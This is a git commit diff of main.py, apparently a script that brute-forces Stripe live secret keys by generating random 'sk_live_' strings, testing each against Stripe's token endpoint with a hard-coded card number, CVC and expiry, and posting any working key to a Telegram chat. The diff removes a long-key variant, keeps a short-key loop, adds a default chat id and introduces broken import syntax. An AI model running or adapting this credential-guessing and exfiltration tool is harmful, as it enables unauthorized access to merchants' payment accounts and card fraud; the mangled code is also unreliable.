54c538f153d64a143dc5f5a3c8c30ac87af25c4d
Mr Vishal <67860986+Mrvishal2k2@users.noreply.github.com>
2022-03-10 19:21:17 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,16 +1,10 @@
-import requests, random, string, time, os
+import requests, /
+       random,/
+       string, /
+       os
 
 token = os.environ.get("BOT_TOKEN")
-chatid = os.environ.get("FORWARD_ID")
-
-def long_key():
-  skkey = random.choice(['sk_live_51H', 'sk_live_51J'])+''.join(random.choices( string.digits + string.ascii_letters, k = 96))
-  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
-  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
-    print(f"DEAD > {skkey}")
-  else:
-    print(f"LIVE > {skkey}")
-    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
+chatid = os.environ.get("FORWARD_ID","-1001566858781")
     
 def short_key():
   skkey = "sk_live_"+''.join(random.choices( string.digits + string.ascii_letters, k = 24))
@@ -21,8 +15,5 @@ def short_key():
     print(f"LIVE > {skkey}")
     requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
     
-while True:
-  long_key()
-  #time.sleep(0.5) #if your heroku account keeps getting banned
+while 1:
   short_key()
-    
